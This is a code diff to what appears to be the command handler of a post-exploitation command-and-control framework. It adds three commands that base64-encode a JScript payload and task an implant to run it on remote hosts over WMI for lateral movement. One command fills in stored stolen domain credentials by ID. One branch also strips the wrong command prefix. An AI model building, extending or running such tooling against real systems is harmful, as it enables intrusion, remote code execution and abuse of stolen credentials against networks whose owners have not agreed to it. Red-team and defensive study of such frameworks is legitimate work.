@@ -233,6 +233,59 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         cmd = "invoke-wmiexec %s" % params
         new_task(cmd, user, randomuri)
 
+    elif command.startswith("invoke-wmiproxyjspayload"):
+        check_module_loaded("New-JScriptShell.ps1", randomuri, user)
+        if os.path.isfile(("%s%sDotNet2JS.js" % (PayloadsDirectory, "Proxy"))):
+            with open("%s%sDotNet2JS.js" % (PayloadsDirectory, "Proxy"), "r") as p:
+                payload = p.read()
+            payload = base64.b64encode(payload.encode('UTF-8'))
+            params = re.compile("invoke-wmiproxyjspayload ", re.IGNORECASE)
+            params = params.sub("", command)
+            new_task("$Payload=\"%s\"" % (payload.decode('utf-8')), user, randomuri)
+            cmd = "new-jscriptshell %s -payload $Payload" % (params)
+            new_task(cmd, user, randomuri)
+        else:
+            startup(user, "Need to run createproxypayload first")
+
+    elif command.startswith("invoke-wmijsdaisypayload"):
+        check_module_loaded("New-JScriptShell.ps1", randomuri, user)
+        daisyname = input("Name required: ")
+        if os.path.isfile(("%s%sDotNet2JS.js" % (PayloadsDirectory, daisyname))):
+            with open("%s%sDotNet2JS.js" % (PayloadsDirectory, daisyname), "r") as p:
+                payload = p.read()
+            payload = base64.b64encode(payload.encode('UTF-8'))
+            params = re.compile("invoke-wmiproxyjspayload ", re.IGNORECASE)
+            params = params.sub("", command)
+            new_task("$Payload=\"%s\"" % (payload.decode('utf-8')), user, randomuri)
+            cmd = "new-jscriptshell %s -payload $Payload" % (params)
+            new_task(cmd, user, randomuri)
+        else:
+            startup(user, "Need to run createdaisypayload first")
+
+    elif command.startswith("invoke-wmijspayload"):
+        check_module_loaded("New-JScriptShell.ps1", randomuri, user)
+        with open("%s%sDotNet2JS.js" % (PayloadsDirectory, ""), "r") as p:
+            payload = p.read()
+        payload = base64.b64encode(payload.encode('UTF-8'))
+
+        params = re.compile("invoke-wmijspayload ", re.IGNORECASE)
+        params = params.sub("", command)
+        if "-credid" in command:
+            p = re.compile(r"-credid (\w*)")
+            credId = re.search(p, command)
+            if credId:
+                credId = credId.group(1)
+            else:
+                startup(user, "Please specify a credid")
+            creds = get_cred_by_id(credId)
+            if creds is None:
+                startup(user, "Unrecognised CredID: %s" % credId)
+            params = params.replace("-credid %s" % credId, "")
+            params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+        new_task("$Payload=\"%s\"" % (payload.decode('utf-8')), user, randomuri)
+        cmd = "new-jscriptshell %s -payload $Payload" % (params)
+        new_task(cmd, user, randomuri)
+
     elif command.startswith("invoke-wmiproxypayload"):
         check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
         if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, "Proxy"))):
